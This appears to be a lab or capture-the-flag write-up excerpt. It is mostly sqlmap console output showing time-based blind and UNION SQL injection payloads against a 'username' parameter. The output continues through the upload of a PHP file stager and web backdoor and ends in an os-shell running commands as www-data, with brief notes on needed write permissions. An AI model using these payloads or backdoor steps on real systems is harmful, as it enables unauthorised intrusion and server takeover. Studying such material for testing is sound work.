you have not declared cookie(s), while server wants to set its own ('USECURITYID=hvgu066v4ss...spbgjid8b2'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=alex' AND (SELECT 3713 FROM (SELECT(SLEEP(5)))DePN) AND 'wVsF'='wVsF

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: username=-3760' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170707a71,0x556c6c594452414f576a744a73504d734d74537a474957704c684b6a6d676f79496e694477664d67,0x7170766b71)-- -
---
[06:23:40] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.46
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[06:23:40] [INFO] going to use a web backdoor for command prompt
[06:23:40] [INFO] fingerprinting the back-end DBMS operating system
[06:23:40] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 
do you want sqlmap to further try to provoke the full path disclosure? [Y/n] n
[06:23:46] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 1
[06:23:48] [WARNING] unable to automatically parse any web server path
[06:23:48] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[06:23:48] [WARNING] unable to upload the file stager on '/var/www/'
[06:23:48] [INFO] trying to upload the file stager on '/var/www/' via UNION method
[06:23:49] [WARNING] expect junk characters inside the file as a leftover from UNION query
[06:23:49] [INFO] the remote file '/var/www/tmpurtts.php' is larger (707 B) than the local file '/tmp/sqlmaple0nfp8012802/tmpe9wtfn1b' (700B)                                                             
[06:23:49] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[06:23:49] [WARNING] unable to upload the file stager on '/var/www/html/'
[06:23:49] [INFO] trying to upload the file stager on '/var/www/html/' via UNION method
[06:23:50] [INFO] the remote file '/var/www/html/tmpudggd.php' is larger (712 B) than the local file '/tmp/sqlmaple0nfp8012802/tmp4oezlmlk' (705B)
[06:23:50] [INFO] trying to upload the file stager on '/var/www/htdocs/' via LIMIT 'LINES TERMINATED BY' method                                                                                           
[06:23:50] [INFO] the file stager has been successfully uploaded on '/var/www/htdocs/' - http://192.168.37.128:80/tmpuxstl.php
[06:23:50] [INFO] the backdoor has been successfully uploaded on '/var/www/htdocs/' - http://192.168.37.128:80/tmpbjcpu.php
[06:23:50] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'www-data'
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
os-shell> 

```

> This is on condition that we have write permission on **`www`** directroy.

> Initially, sqlmap threw an error **`unable to upload shell as the user have may not have right permissions to the sepcifed directory`**





